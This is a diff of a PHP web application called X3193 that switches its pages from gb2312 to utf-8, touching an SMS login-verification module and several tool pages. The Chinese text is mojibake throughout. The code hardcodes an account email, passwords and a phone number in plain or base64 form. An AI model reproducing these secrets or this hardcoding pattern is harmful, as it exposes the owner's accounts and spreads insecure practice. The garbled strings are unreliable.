                     	$AuthClientLogin = $google_calendar->googleauthclientlogin(trim(base64_encode('xcy6272003@gmail.com')),trim(base64_encode('EUIfgwe7a')),trim('calendar'));
-               		$google_calendar->googlecalendarsendsms($AuthClientLogin,trim('±¾´ÎµÇÂ½ÑéÖ¤Ê§°Ü£¡±¾´ÎÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]),trim('X3193µÇÂ¼ÑéÖ¤'),trim('X3193µÇÂ¼ÑéÖ¤Ä£¿é'));
+               		$google_calendar->googlecalendarsendsms($AuthClientLogin,trim('æœ¬æ¬¡ç™»é™†éªŒè¯å¤±è´¥ï¼æœ¬æ¬¡éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]),trim('X3193ç™»å½•éªŒè¯'),trim('X3193ç™»å½•éªŒè¯æ¨¡å—'));
             }
             elseif (strtolower(trim(request('verify'))) == 'voxeo'){
                //$voxeo = new imified_class();
-               //$voxeo->voxeosendsms('x3193','EUIfgwe7','+8615998963077','±¾´ÎµÇÂ½ÑéÖ¤Ê§°Ü£¡±¾´ÎÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]);
+               //$voxeo->voxeosendsms('x3193','EUIfgwe7','+8615998963077','æœ¬æ¬¡ç™»é™†éªŒè¯å¤±è´¥ï¼æœ¬æ¬¡éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]);
             		$voxeo = new voxeo_class();
-                $voxeo->voxeosendsms('+8615998963077','Sorry! The verification code is£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']);
+                $voxeo->voxeosendsms('+8615998963077','Sorry! The verification code isï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']);
                 
             }   
         		elseif (strtolower(trim(request('verify'))) == 'fetion'){
-							$fetion = new fetion_class();	// ÊÖ»úºÅ¡¢·ÉĞÅÃÜÂë
-							$fetion->sendmsg('',iconv('gb2312','utf-8','±¾´ÎµÇÂ½ÑéÖ¤Ê§°Ü£¡±¾´ÎÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]));	// ½ÓÊÕÈËÊÖ»úºÅ¡¢·ÉĞÅÄÚÈİ      	
+							$fetion = new fetion_class();	// æ‰‹æœºå·ã€é£ä¿¡å¯†ç 
+							$fetion->sendmsg('',iconv('gb2312','utf-8','æœ¬æ¬¡ç™»é™†éªŒè¯å¤±è´¥ï¼æœ¬æ¬¡éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]));	// æ¥æ”¶äººæ‰‹æœºå·ã€é£ä¿¡å†…å®¹      	
          			
-							//$fetion = new PHPFetion('15998963077', 'EUIfgwe7');	// ÊÖ»úºÅ¡¢·ÉĞÅÃÜÂë
-							//$fetion->send('15998963077', iconv('gb2312','utf-8','±¾´ÎµÇÂ½ÑéÖ¤Ê§°Ü£¡±¾´ÎÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]));	// ½ÓÊÕÈËÊÖ»úºÅ¡¢·ÉĞÅÄÚÈİ      	
+							//$fetion = new PHPFetion('15998963077', 'EUIfgwe7');	// æ‰‹æœºå·ã€é£ä¿¡å¯†ç 
+							//$fetion->send('15998963077', iconv('gb2312','utf-8','æœ¬æ¬¡ç™»é™†éªŒè¯å¤±è´¥ï¼æœ¬æ¬¡éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]));	// æ¥æ”¶äººæ‰‹æœºå·ã€é£ä¿¡å†…å®¹      	
       	
    					 //$voxeo = new voxeo_class();
-             //$voxeo->voxeosendsms('x3193','EUIfgwe7','8615998963077','±¾´ÎÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']);
+             //$voxeo->voxeosendsms('x3193','EUIfgwe7','8615998963077','æœ¬æ¬¡éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']);
       			}           
                         }
                          
@@ -3946,15 +5574,15 @@ exit;
 
 <?php 
 function stock_10jqka(){ // idoll function start
-header('Content-Type: text/html; charset=gb2312');
+header('Content-Type: text/html; charset=utf-8');
 ?>
 <head>
 <?php 
 $style = new css();
 $style->ico();
-$style->title("X3193 - ¹ÉÆ±");
+$style->title("X3193 - è‚¡ç¥¨");
 $skincolor = selstyle(trim(request("skin")));
-$sCrLf = chr(13) . chr(10); // »Ø³µ + »»ĞĞ
+$sCrLf = chr(13) . chr(10); // å›è½¦ + æ¢è¡Œ
 ?>
 
 <table width="100%" height="120%" align="center" valign="center">
@@ -3968,9 +5596,9 @@ $sCrLf = chr(13) . chr(10); // »Ø³µ + »»ĞĞ
                 <td align="right" style="border:0">             
                         <?php  
                          IF(!is_wap())
-                        	sellink("Ö÷Ò³|²å¼ş|ËÑË÷|ÓòÃû|FTP|¶ÁÊé|ÓÎÏ·|¶ÌÆ¬|¹ÉÆ±|VPN",$skincolor);
+                        	sellink("ä¸»é¡µ|æ’ä»¶|æœç´¢|åŸŸå|FTP|è¯»ä¹¦|æ¸¸æˆ|çŸ­ç‰‡|è‚¡ç¥¨|VPN",$skincolor);
                         else
-                        	sellink("Ö÷Ò³|ËÑË÷|ÓòÃû|FTP|¶ÌÆ¬",$skincolor);
+                        	sellink("ä¸»é¡µ|æœç´¢|åŸŸå|FTP|çŸ­ç‰‡",$skincolor);
                         ?>
                 </td>
         </tr>           
@@ -3999,15 +5627,15 @@ $style->footer();
 
 <?php 
 function stickam(){
-header('Content-Type: text/html; charset=gb2312');
+header('Content-Type: text/html; charset=utf-8');
 ?>
 <head>
 <?php 
 $style = new css();
 $style->ico();
-$style->title("X3193 - »áÒé");
+$style->title("X3193 - ä¼šè®®");
 $skincolor = selstyle(trim(request("skin")));
-$sCrLf = chr(13) . chr(10); // »Ø³µ + »»ĞĞ
+$sCrLf = chr(13) . chr(10); // å›è½¦ + æ¢è¡Œ
 ?>
 
 <table width="100%" height="100%" align="center" valign="center">
@@ -4021,9 +5649,9 @@ $sCrLf = chr(13) . chr(10); // »Ø³µ + »»ĞĞ
                 <td align="right" style="border:0">             
                         <?php  
                          IF(!is_wap())
-                        	sellink("Ö÷Ò³|²å¼ş|ËÑË÷|ÓòÃû|FTP|¶ÁÊé|ÓÎÏ·|¶ÌÆ¬|¹ÉÆ±|VPN",$skincolor);
+                        	sellink("ä¸»é¡µ|æ’ä»¶|æœç´¢|åŸŸå|FTP|è¯»ä¹¦|æ¸¸æˆ|çŸ­ç‰‡|è‚¡ç¥¨|VPN",$skincolor);
                         else
-                        	sellink("Ö÷Ò³|ËÑË÷|ÓòÃû|FTP|¶ÌÆ¬",$skincolor);
+                        	sellink("ä¸»é¡µ|æœç´¢|åŸŸå|FTP|çŸ­ç‰‡",$skincolor);
                         ?>
                 </td>
         </tr>           
@@ -4069,16 +5697,16 @@ $style->footer();
 
 <?php 
 function webxml(){
-header('Content-Type: text/html; charset=gb2312');
+header('Content-Type: text/html; charset=utf-8');
 
 ?>
 <head>
 <?php 
 $style = new css();
 $style->ico();
-$style->title("X3193 - ·şÎñ");
+$style->title("X3193 - æœåŠ¡");
 $skincolor = selstyle(trim(request("skin")));
-$sCrLf = chr(13) . chr(10); // »Ø³µ + »»ĞĞ
+$sCrLf = chr(13) . chr(10); // å›è½¦ + æ¢è¡Œ
 ?>
 
 <table width="100%" height="100%" align="center" valign="center">
@@ -4092,9 +5720,9 @@ $sCrLf = chr(13) . chr(10); // »Ø³µ + »»ĞĞ
                 <td align="right" style="border:0">             
                         <?php  
                          IF(!is_wap())
-                        	sellink("Ö÷Ò³|²å¼ş|ËÑË÷|ÓòÃû|FTP|¶ÁÊé|ÓÎÏ·|¶ÌÆ¬|¹ÉÆ±|VPN",$skincolor);
+                        	sellink("ä¸»é¡µ|æ’ä»¶|æœç´¢|åŸŸå|FTP|è¯»ä¹¦|æ¸¸æˆ|çŸ­ç‰‡|è‚¡ç¥¨|VPN",$skincolor);
                         else
-                        	sellink("Ö÷Ò³|ËÑË÷|ÓòÃû|FTP|¶ÌÆ¬",$skincolor);
+                        	sellink("ä¸»é¡µ|æœç´¢|åŸŸå|FTP|çŸ­ç‰‡",$skincolor);
                         ?>
                 </td>
         </tr>           
@@ -4108,7 +5736,7 @@ $sCrLf = chr(13) . chr(10); // »Ø³µ + »»ĞĞ
 </table>
 <?php 
 
-// Ã¿Ò³ÌõÊı
+// æ¯é¡µæ¡æ•°
 if (trim(request('pagesize')) == "")
         $pagesize = 30;
 elseif (trim(request('pagesize')) > 50)
@@ -4144,14 +5772,14 @@ function changeimg()
         <tr class="tdtbg" height="40">
                 <td align="center">
                         <form action="<?php echo ScriptPath()?>?api=byban&skin=<?php echo $skincolor;?>&action=<?php echo encodeuri("mailbox.list");?>" method="post" name="imap">
-                        &nbspÖ¤È¯´úÂë£º<input type="text" class="text" name="server" value="" style="height:20px;width:12%;font-size:11px" <?php  $style->input("#FCFC9D","") ?>>  
+                        &nbspè¯åˆ¸ä»£ç ï¼š<input type="text" class="text" name="server" value="" style="height:20px;width:12%;font-size:11px" <?php  $style->input("#FCFC9D","") ?>>  
                         <SELECT name="servertype" size="1" <?php  $style->selectarea("#FCFC9D","");?> style="width:77px;height:16px;font-size:12px">
-                                <OPTION VALUE="<?php echo encodeuri("ĞĞÇé");?>">ĞĞÇé¼ò±¨</OPTION>
-                                <OPTION VALUE="<?php echo encodeuri("×ßÊÆ");?>">×ßÊÆÍ¼</OPTION>
-                                <OPTION VALUE="<?php echo encodeuri("KÏß");?>">K ÏßÍ¼</OPTION>
-                                <OPTION VALUE="<?php echo encodeuri("Íâ»ã");?>"  onchange="exchange();">Íâ»ãĞĞÇé</OPTION>
+                                <OPTION VALUE="<?php echo encodeuri("è¡Œæƒ…");?>">è¡Œæƒ…ç®€æŠ¥</OPTION>
+                                <OPTION VALUE="<?php echo encodeuri("èµ°åŠ¿");?>">èµ°åŠ¿å›¾</OPTION>
+                                <OPTION VALUE="<?php echo encodeuri("Kçº¿");?>">K çº¿å›¾</OPTION>
+                                <OPTION VALUE="<?php echo encodeuri("å¤–æ±‡");?>"  onchange="exchange();">å¤–æ±‡è¡Œæƒ…</OPTION>
                         </SELECT>
-                        &nbspÑéÖ¤Âë£º<input <?php echo $style->input("#FCFC9D","") ?> maxlength="4" name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="¿´²»Çå³ş£¿»»Ò»¸ö£¡"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath()?>?api=checkcode" border="0"></a>
+                        &nbspéªŒè¯ç ï¼š<input <?php echo $style->input("#FCFC9D","") ?> maxlength="4" name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="çœ‹ä¸æ¸…æ¥šï¼Ÿæ¢ä¸€ä¸ªï¼"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath()?>?api=checkcode" border="0"></a>
                         &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
                 </td>
         </tr>   
@@ -4187,16 +5815,16 @@ function changeimg()
         <tr class="tdtbg" height="40">
                 <td align="center">
                         <form action="<?php echo ScriptPath()?>?api=byban&skin=<?php echo $skincolor;?>&action=<?php echo encodeuri("mailbox.list");?>" method="post" name="imap">
-                        &nbspÓòÃû£º<input type="text" class="text" name="server" value="" style="height:20px;width:12%;font-size:11px" <?php  $style->input("#FCFC9D","") ?>>  
-                        &nbspÓÃ»§Ãû£º<input type="text" class="text" name="uname" value="" style="height:20px;width:12%;font-size:11px" <?php  $style->input("#FCFC9D","") ?>>  
-                        &nbspÃÜÂë£º<input type="password" class="text" name="pwd" value="" style="height:20px;width:12%;font-size:11px" <?php  $style->input("#FCFC9D","") ?>> 
-                        &nbsp¶Ë¿Ú£º<input type="port" class="text" name="port" value="143" style="height:20px;width:4%;font-size:11px" <?php  $style->input("#FCFC9D","") ?>> 
+                        &nbspåŸŸåï¼š<input type="text" class="text" name="server" value="" style="height:20px;width:12%;font-size:11px" <?php  $style->input("#FCFC9D","") ?>>  
+                        &nbspç”¨æˆ·åï¼š<input type="text" class="text" name="uname" value="" style="height:20px;width:12%;font-size:11px" <?php  $style->input("#FCFC9D","") ?>>  
+                        &nbspå¯†ç ï¼š<input type="password" class="text" name="pwd" value="" style="height:20px;width:12%;font-size:11px" <?php  $style->input("#FCFC9D","") ?>> 
+                        &nbspç«¯å£ï¼š<input type="port" class="text" name="port" value="143" style="height:20px;width:4%;font-size:11px" <?php  $style->input("#FCFC9D","") ?>> 
                         <SELECT name="servertype" size="1" <?php  $style->selectarea("#FCFC9D","");?> style="width:55px;height:16px;font-size:12px">
                                 <OPTION VALUE="imap">IMAP</OPTION>
                                 <OPTION VALUE="pop3">POP3</OPTION>
                                 <OPTION VALUE="nntp">NNTP</OPTION>
                         </SELECT>
-                        &nbspÑéÖ¤Âë£º<input <?php echo $style->input("#FCFC9D","") ?> maxlength="4" name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="¿´²»Çå³ş£¿»»Ò»¸ö£¡"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath()?>?api=checkcode" border="0"></a>
+                        &nbspéªŒè¯ç ï¼š<input <?php echo $style->input("#FCFC9D","") ?> maxlength="4" name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="çœ‹ä¸æ¸…æ¥šï¼Ÿæ¢ä¸€ä¸ªï¼"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath()?>?api=checkcode" border="0"></a>
                         &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
                 </td>
         </tr>   
@@ -4210,16 +5838,16 @@ $style->footer();
 
 <?php 
 function picture(){
-header('Content-Type: text/html; charset=gb2312');
+header('Content-Type: text/html; charset=utf-8');
 
 ?>
 <head>
 <?php 
 $style = new css();
 $style->ico();
-$style->title("X3193 - Í¼Æ¬");
+$style->title("X3193 - å›¾ç‰‡");
 $skincolor = selstyle(trim(request("skin")));
-$sCrLf = chr(13) . chr(10); // »Ø³µ + »»ĞĞ
+$sCrLf = chr(13) . chr(10); // å›è½¦ + æ¢è¡Œ
 ?>
 
 <table width="100%" height="100%" align="center" valign="center">
@@ -4233,9 +5861,9 @@ $sCrLf = chr(13) . chr(10); // »Ø³µ + »»ĞĞ
                 <td align="right" style="border:0">             
                         <?php  
                          IF(!is_wap())
-                        	sellink("Ö÷Ò³|²å¼ş|ËÑË÷|ÓòÃû|FTP|¶ÁÊé|ÓÎÏ·|¶ÌÆ¬|¹ÉÆ±|VPN",$skincolor);
+                        	sellink("ä¸»é¡µ|æ’ä»¶|æœç´¢|åŸŸå|FTP|è¯»ä¹¦|æ¸¸æˆ|çŸ­ç‰‡|è‚¡ç¥¨|VPN",$skincolor);
                         else
-                        	sellink("Ö÷Ò³|ËÑË÷|ÓòÃû|FTP|¶ÌÆ¬",$skincolor);
+                        	sellink("ä¸»é¡µ|æœç´¢|åŸŸå|FTP|çŸ­ç‰‡",$skincolor);
                         ?>
                 </td>
         </tr>           
@@ -4249,7 +5877,7 @@ $sCrLf = chr(13) . chr(10); // »Ø³µ + »»ĞĞ
 </table>
 <?php 
 
-// Ã¿Ò³ÌõÊı
+// æ¯é¡µæ¡æ•°
 if (trim(request('pagesize')) == "")
         $pagesize = 30;
 elseif (trim(request('pagesize')) > 50)
@@ -4295,10 +5923,10 @@ function changeimg()
 }
 function dofiletype(){
         if (document.getElementById("filetype").value == "local"){
-                document.getElementById("filepath").innerHTML = '&nbspÍ¼Æ¬µØÖ·£º<input type="file" class="text" name="filepath" value="" style="height:20px;width:20%;font-size:11px" onmouseover="this.style.backgroundColor=\'#FCFC9D\';" onmouseout="this.style.backgroundColor=\'\';" onmousedown="this.style.backgroundColor=\'#FCFC9D\';">';
+                document.getElementById("filepath").innerHTML = '&nbspå›¾ç‰‡åœ°å€ï¼š<input type="file" class="text" name="filepath" value="" style="height:20px;width:20%;font-size:11px" onmouseover="this.style.backgroundColor=\'#FCFC9D\';" onmouseout="this.style.backgroundColor=\'\';" onmousedown="this.style.backgroundColor=\'#FCFC9D\';">';
         }       
         else if(document.getElementById("filetype").value == "remote"){
-                document.getElementById("filepath").innerHTML = '&nbspÍ¼Æ¬µØÖ·£º<input type="text" class="text" name="filepath" value="" style="height:20px;width:20%;font-size:11px" onmouseover="this.style.backgroundColor=\'#FCFC9D\';" onmouseout="this.style.backgroundColor=\'\';" onmousedown="this.style.backgroundColor=\'#FCFC9D\';">';
+                document.getElementById("filepath").innerHTML = '&nbspå›¾ç‰‡åœ°å€ï¼š<input type="text" class="text" name="filepath" value="" style="height:20px;width:20%;font-size:11px" onmouseover="this.style.backgroundColor=\'#FCFC9D\';" onmouseout="this.style.backgroundColor=\'\';" onmousedown="this.style.backgroundColor=\'#FCFC9D\';">';
         }       
 }
 function dofileext(){
@@ -4315,17 +5943,17 @@ function dofileext(){
                 <td align="center" valign="center" id="picture">
                         <form action="<?php echo ScriptPath();?>?api=picture&action=&skin=<?php  echo $skincolor;?>&c=<?php echo encodeuri(trim(request("c")))?>&t=<?php echo encodeuri(trim(request("t")))?>&u=<?php echo encodeuri(trim(request("u")))?>" method="post" name="picture">
                         <SELECT name="filetype" size="1" <?php  $style->selectarea("#FCFC9D","");?> style="width:75px;height:16px;font-size:12px" onchange="dofiletype();">
-                                <OPTION VALUE="local">±¾µØÍ¼Æ¬</OPTION>
-                                <OPTION VALUE="remote">Ô¶³ÌÍ¼Æ¬</OPTION>
+                                <OPTION VALUE="local">æœ¬åœ°å›¾ç‰‡</OPTION>
+                                <OPTION VALUE="remote">è¿œç¨‹å›¾ç‰‡</OPTION>
                         </SELECT>
-                        <span id="filepath">&nbspÍ¼Æ¬µØÖ·£º<input type="file" class="text" name="filepath" value="" style="height:20px;width:20%;font-size:11px" <?php  $style->input("#FCFC9D",""); ?>>  </span>
-                        &nbspÄ¿±ê¸ñÊ½£º
+                        <span id="filepath">&nbspå›¾ç‰‡åœ°å€ï¼š<input type="file" class="text" name="filepath" value="" style="height:20px;width:20%;font-size:11px" <?php  $style->input("#FCFC9D",""); ?>>  </span>
+                        &nbspç›®æ ‡æ ¼å¼ï¼š
                         <SELECT name="fileext" size="1" <?php  $style->selectarea("#FCFC9D","");?> style="width:55px;height:16px;font-size:12px" onchange="dofileext();">
                                 <OPTION VALUE="XBM">XBM</OPTION>
                                 <OPTION VALUE="ICON">ICON</OPTION>
                         </SELECT>
                         <span id="iconsize"></span>
-                        &nbspÑéÖ¤Âë£º<input <?php  $style->input("#FCFC9D",""); ?> maxlength="4" name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="¿´²»Çå³ş£¿»»Ò»¸ö£¡"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath();?>?api=checkcode" border="0"></a>
+                        &nbspéªŒè¯ç ï¼š<input <?php  $style->input("#FCFC9D",""); ?> maxlength="4" name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="çœ‹ä¸æ¸…æ¥šï¼Ÿæ¢ä¸€ä¸ªï¼"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath();?>?api=checkcode" border="0"></a>
                         &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
                 </td>
         </tr>   
@@ -4341,43 +5969,43 @@ $style->footer();
 function icon(){
 
 $iconsize = '50';
-$im = @imagecreate($iconsize, $iconsize);//´´½¨³¤¿í¸÷50ÏñËØµÄÍ¼Ïó£¬¸ñÊ½Î´¶¨¡£
+$im = @imagecreate($iconsize, $iconsize);//åˆ›å»ºé•¿å®½å„50åƒç´ çš„å›¾è±¡ï¼Œæ ¼å¼æœªå®šã€‚
 
-$background_color = imagecolorallocate($im, 128, 255, 255);//´´½¨ÇàÉ«µÄ¡°PHP GD¡±Í¼Ïó±äÁ¿£¬ÒÔ±¸ÓÃ£¬ÕâÀï×÷Îª±³¾°É«²Ê¡£
-$text_color = imagecolorallocate($im, 0, 0, 255);//´´½¨À¼É«ÎÄ×ÖµÄ¡°PHP GD¡±×¨ÓÃ±äÁ¿£¬ÒÔ±¸ÓÃ¡£
+$background_color = imagecolorallocate($im, 128, 255, 255);//åˆ›å»ºé’è‰²çš„â€œPHP GDâ€å›¾è±¡å˜é‡ï¼Œä»¥å¤‡ç”¨ï¼Œè¿™é‡Œä½œä¸ºèƒŒæ™¯è‰²å½©ã€‚
+$text_color = imagecolorallocate($im, 0, 0, 255);//åˆ›å»ºå…°è‰²æ–‡å­—çš„â€œPHP GDâ€ä¸“ç”¨å˜é‡ï¼Œä»¥å¤‡ç”¨ã€‚
 
-$linecolor = imagecolorallocate($im, 0, 0, 0);//´´½¨ºÚÉ«ÊµÏßµÄ¡°PHP GD¡±×¨ÓÃ±äÁ¿£¬ÒÔ±¸ÓÃ¡£
-imagesetthickness($im, 2);//¶¨ÒåÊµÏßµÄ´ÖÏ¸¡£
+$linecolor = imagecolorallocate($im, 0, 0, 0);//åˆ›å»ºé»‘è‰²å®çº¿çš„â€œPHP GDâ€ä¸“ç”¨å˜é‡ï¼Œä»¥å¤‡ç”¨ã€‚
+imagesetthickness($im, 2);//å®šä¹‰å®çº¿çš„ç²—ç»†ã€‚
 
 imageline($im, 0, 1, $iconsize, 1, $linecolor);
-imageline($im, 0, $iconsize-1, $iconsize, $iconsize-1, $linecolor);//ÔÚÍ¼Æ¬µÄ¶¥²¿ºÍµ×²¿»­Á½ÌõÊµÏß¡£
+imageline($im, 0, $iconsize-1, $iconsize, $iconsize-1, $linecolor);//åœ¨å›¾ç‰‡çš„é¡¶éƒ¨å’Œåº•éƒ¨ç”»ä¸¤æ¡å®çº¿ã€‚
 
-imagestring($im, 5, 3, 17,  "X3193", $text_color);//ÔÚÍ¼Æ¬ÖĞ¼ä²¿·ÖÊä³öÀ¼É«×ÖÌå¡£
+imagestring($im, 5, 3, 17,  "X3193", $text_color);//åœ¨å›¾ç‰‡ä¸­é—´éƒ¨åˆ†è¾“å‡ºå…°è‰²å­—ä½“ã€‚
 //$text = 'Testing...';
 //$font = './arial.ttf';
-//imagettftext($im, 20, 0, 10, 20, $text_color, $font, $text);// ÀûÓÃ¸ùÄ¿Â¼arial.ttf×ÖÌåÎÄ¼şÊä³öÎÄ×Ö£¬ĞèÒªÖÚ¶à×ÖÌåÎÄ¼ş¡£
+//imagettftext($im, 20, 0, 10, 20, $text_color, $font, $text);// åˆ©ç”¨æ ¹ç›®å½•arial.ttfå­—ä½“æ–‡ä»¶è¾“å‡ºæ–‡å­—ï¼Œéœ€è¦ä¼—å¤šå­—ä½“æ–‡ä»¶ã€‚
 
 $debug = "0";
 if ($debug == '1'){
-        header("Content-type: image/png");//µ÷ÊÔÊ±£¬Êä³öPNG¸ñÊ½µÄÍ¼Ïó£¬ÓëimagepngÅäºÏÊ¹ÓÃ¡£
-        imagepng($im);//µ÷ÊÔÊ±£¬Êä³öPNG¸ñÊ½µÄÍ¼Ïó£¬Óëheader()ÅäºÏÊ¹ÓÃ¡£
+        header("Content-type: image/png");//è°ƒè¯•æ—¶ï¼Œè¾“å‡ºPNGæ ¼å¼çš„å›¾è±¡ï¼Œä¸imagepngé…åˆä½¿ç”¨ã€‚
+        imagepng($im);//è°ƒè¯•æ—¶ï¼Œè¾“å‡ºPNGæ ¼å¼çš„å›¾è±¡ï¼Œä¸header()é…åˆä½¿ç”¨ã€‚
         return;
 }
 
 $size = 32;  
-$resize_im = @imagecreatetruecolor($size,$size);  // ´´½¨Ò»·ùÕæ²ÊÍ¼Ïó¡£
+$resize_im = @imagecreatetruecolor($size,$size);  // åˆ›å»ºä¸€å¹…çœŸå½©å›¾è±¡ã€‚
 $resize = $iconsize;
-imagecopyresampled($resize_im,$im,0,0,0,0,$size,$size,$resize,$resize);  // ÖØ²ÉÑù¿½±´²¿·ÖÍ¼Ïñ²¢µ÷Õû´óĞ¡µ½ĞÂÕæ²ÊÍ¼ÏóÖĞ¡£
+imagecopyresampled($resize_im,$im,0,0,0,0,$size,$size,$resize,$resize);  // é‡é‡‡æ ·æ‹·è´éƒ¨åˆ†å›¾åƒå¹¶è°ƒæ•´å¤§å°åˆ°æ–°çœŸå½©å›¾è±¡ä¸­ã€‚
 
 $icon = new phpthumb_ico();  
 $gd_image_array = array($resize_im);  
-$icon_data = $icon->GD2ICOstring($gd_image_array); // µ÷ÓÃGD2ICON º¯Êı¿â´´½¨Î´ÃüÃûICONÍ¼Ïó¡£
+$icon_data = $icon->GD2ICOstring($gd_image_array); // è°ƒç”¨GD2ICON å‡½æ•°åº“åˆ›å»ºæœªå‘½åICONå›¾è±¡ã€‚
 
-imagedestroy($im);//Ïú»ÙÔ­ÓÉµÄ·Çico¸ñÊ½Í¼Ïó¡£
-imagedestroy($resize_im);//Ïú»ÙÔ­ÓÉµÄico¸ñÊ½Í¼Ïó¡£
+imagedestroy($im);//é”€æ¯åŸç”±çš„éicoæ ¼å¼å›¾è±¡ã€‚
+imagedestroy($resize_im);//é”€æ¯åŸç”±çš„icoæ ¼å¼å›¾è±¡ã€‚
 
 $filename = "X3193.ico";  
-if(file_put_contents($filename, $icon_data)){  //±£´æicoÍ¼Ïó¡£
+if(file_put_contents($filename, $icon_data)){  //ä¿å­˜icoå›¾è±¡ã€‚
         return 'ok';
 }
 else{  
@@ -4390,16 +6018,16 @@ exit;
 
 <?php 
 function jiankongbao(){
-header('Content-Type: text/html; charset=gb2312');
+header('Content-Type: text/html; charset=utf-8');
 
 ?>
 <head>
 <?php 
 $style = new css();
 $style->ico();
-$style->title("X3193 - ¶¨Ê±");
+$style->title("X3193 - å®šæ—¶");
 $skincolor = selstyle(trim(request("skin")));
-$sCrLf = chr(13) . chr(10); // »Ø³µ + »»ĞĞ
+$sCrLf = chr(13) . chr(10); // å›è½¦ + æ¢è¡Œ
 ?>
 
 <table width="100%" height="100%" align="center" valign="center">
@@ -4413,9 +6041,9 @@ $sCrLf = chr(13) . chr(10); // »Ø³µ + »»ĞĞ
                 <td align="right" style="border:0">             
                         <?php  
                          IF(!is_wap())
-                        	sellink("Ö÷Ò³|²å¼ş|ËÑË÷|ÓòÃû|FTP|¶ÁÊé|ÓÎÏ·|¶ÌÆ¬|¹ÉÆ±|VPN",$skincolor);
+                        	sellink("ä¸»é¡µ|æ’ä»¶|æœç´¢|åŸŸå|FTP|è¯»ä¹¦|æ¸¸æˆ|çŸ­ç‰‡|è‚¡ç¥¨|VPN",$skincolor);
                         else
-                        	sellink("Ö÷Ò³|ËÑË÷|ÓòÃû|FTP|¶ÌÆ¬",$skincolor);
+                        	sellink("ä¸»é¡µ|æœç´¢|åŸŸå|FTP|çŸ­ç‰‡",$skincolor);
                         ?>
                 </td>
         </tr>           
@@ -4429,7 +6057,7 @@ $sCrLf = chr(13) . chr(10); // »Ø³µ + »»ĞĞ
 </table>
 <?php 
 
-// Ã¿Ò³ÌõÊı
+// æ¯é¡µæ¡æ•°
 if (trim(request('pagesize')) == "")
         $pagesize = 30;
 elseif (trim(request('pagesize')) > 50)
@@ -4478,9 +6106,9 @@ function changeimg()
         <tr class="tdtbg" height="35" valign="center">
                 <td align="center" valign="center" id="google">
                         <form action="<?php echo ScriptPath();?>?api=xmpp&skin=<?php  echo $skincolor;?>&c=<?php echo encodeuri(trim(request("c")))?>&t=<?php echo encodeuri(trim(request("t")))?>&u=<?php echo encodeuri(trim(request("u")))?>" method="post" name="google">
-                        &nbspÓÃ»§Ãû£º<input type="text" class="text" name="uname" value="" style="height:20px;width:20%;font-size:11px" <?php  $style->input("#FCFC9D",""); ?>>  
-                        &nbspÃÜÂë£º<input type="password" class="text" name="pwd" value="" style="height:20px;width:10%;font-size:11px" <?php  $style->input("#FCFC9D",""); ?>> 
-                        &nbspÑéÖ¤Âë£º<input <?php  $style->input("#FCFC9D",""); ?> maxlength="4" name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="¿´²»Çå³ş£¿»»Ò»¸ö£¡"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath();?>?api=checkcode" border="0"></a>
+                        &nbspç”¨æˆ·åï¼š<input type="text" class="text" name="uname" value="" style="height:20px;width:20%;font-size:11px" <?php  $style->input("#FCFC9D",""); ?>>  
+                        &nbspå¯†ç ï¼š<input type="password" class="text" name="pwd" value="" style="height:20px;width:10%;font-size:11px" <?php  $style->input("#FCFC9D",""); ?>> 
+                        &nbspéªŒè¯ç ï¼š<input <?php  $style->input("#FCFC9D",""); ?> maxlength="4" name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="çœ‹ä¸æ¸…æ¥šï¼Ÿæ¢ä¸€ä¸ªï¼"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath();?>?api=checkcode" border="0"></a>
                         &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
                 </td>
         </tr>   
@@ -4529,23 +6157,23 @@ function han2ps($str){
 }
 
 function hanpc2enpc($str){
